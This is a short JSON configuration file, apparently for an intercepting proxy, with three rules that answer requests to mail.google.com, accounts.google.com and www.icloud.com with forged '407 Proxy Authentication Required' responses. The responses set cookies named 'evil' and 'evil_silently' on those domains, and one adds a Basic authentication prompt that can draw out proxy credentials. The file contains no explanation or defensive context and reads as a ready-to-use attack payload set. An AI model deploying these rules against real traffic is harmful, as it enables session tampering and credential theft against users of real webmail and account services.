[{
    "url": "mail.google.com:443",
    "urlRegex": false,
    "count": -1,
    "fuzzy": -1,
    "returnHeader": "HTTP/1.1 407 Proxy Authentication Required",
    "headers": [
        "Content-Type: text/custom; charset=utf-8",
        "Set-Cookie: evil=malicious; domain=.mail.google.com; path=/; SECURE;",
        "Proxy-Authenticate: Basic realm=\"proxy.com\""
    ],
    "fromFile": false,
    "body": ""
},
{
    "url": "accounts.google.com:443",
    "urlRegex": false,
    "count": -1,
    "fuzzy": -1,
    "returnHeader": "HTTP/1.1 407 Proxy Authentication Required",
    "headers": [
        "Content-Type: text/custom; charset=utf-8",
        "Set-Cookie: evil_silently=malicious; domain=.accounts.google.com; path=/; SECURE;"
    ],
    "fromFile": false,
    "body": ""
},
{
    "url": "www.icloud.com:443",
    "urlRegex": false,
    "count": -1,
    "fuzzy": -1,
    "returnHeader": "HTTP/1.1 407 Proxy Authentication Required",
    "headers": [
        "Content-Type: text/html; charset=UTF-8",
        "Content-Length: 123",
        "Set-Cookie: evil=malicious; domain=.icloud.com; path=/; SECURE;"
    ],
    "fromFile": true,
    "body": "files/404.htm"
}]
